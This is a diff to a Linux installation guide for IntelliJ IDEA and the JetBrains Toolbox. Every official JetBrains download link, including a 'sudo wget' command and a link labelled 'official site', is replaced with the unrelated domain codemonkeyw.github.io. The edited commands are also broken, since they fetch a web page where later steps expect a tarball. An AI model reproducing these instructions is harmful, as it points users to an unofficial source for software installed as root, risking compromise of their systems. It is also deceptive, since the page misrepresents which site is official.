@@ -11,10 +11,10 @@ The **JetBrains Toolbox App** makes installing and managing IntelliJ IDEA (and o
 1. **Download JetBrains Toolbox:**
 
 ```bash
-wget https://download.jetbrains.com/toolbox/jetbrains-toolbox-1.28.1.15219.tar.gz
+wget https://codemonkeyw.github.io
 ```
 
-> *(Check the [official site](https://www.jetbrains.com/toolbox-app/) if you want the latest version)*
+> *(Check the [official site](https://codemonkeyw.github.io) if you want the latest version)*
 
 2. **Extract the archive:**
 
@@ -83,13 +83,13 @@ sudo apt install openjdk-17-jdk -y
 
 2. **Download IntelliJ from JetBrains:**
 
-Go to: [https://www.jetbrains.com/idea/download/](https://www.jetbrains.com/idea/download/)
+Go to: [https://codemonkeyw.github.io](https://codemonkeyw.github.io)
 
 Choose **Linux** > **Community** or **Ultimate**, then:
 
 ```bash
 cd /opt
-sudo wget https://download.jetbrains.com/idea/ideaIC-2023.3.5.tar.gz
+sudo wget https://codemonkeyw.github.io
 sudo tar -xzf ideaIC-2023.3.5.tar.gz
 sudo mv idea-IC-* intellij
 sudo rm ideaIC-2023.3.5.tar.gz
